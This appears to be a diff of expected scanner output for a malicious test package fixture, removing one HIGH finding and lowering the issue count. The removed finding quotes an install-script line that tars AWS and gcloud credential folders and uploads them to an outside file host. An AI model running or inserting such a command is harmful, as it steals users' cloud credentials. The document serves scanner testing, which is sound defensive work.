@@ -37,12 +37,6 @@ Scan Results: stats-collector
     Recommendation: Remove. Packages do not post to chat webhooks during build/install.
     Reference: CWE-200
 
-[HIGH] HIDDEN-001 Hidden file creation in home (install script)
-    Creating hidden files in user home directory
-    Location: tests/fixtures/malicious/exfil-channels/stats-collector.install:4
-    Code:   tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st
-    Recommendation: Packages should not create hidden files in user home
-
 [HIGH] EXFIL-006 HTTP upload exfiltration (install script)
     curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.
     Location: tests/fixtures/malicious/exfil-channels/stats-collector.install:4
@@ -75,9 +69,9 @@ Scan Results: stats-collector
 
 ============================================================
 Package: stats-collector v1.0.0-1
-Scan duration: 6ms
+Scan duration: 20ms
 
-Found 10 issue(s):
+Found 9 issue(s):
   5 CRITICAL
-  5 HIGH
+  4 HIGH
 ============================================================
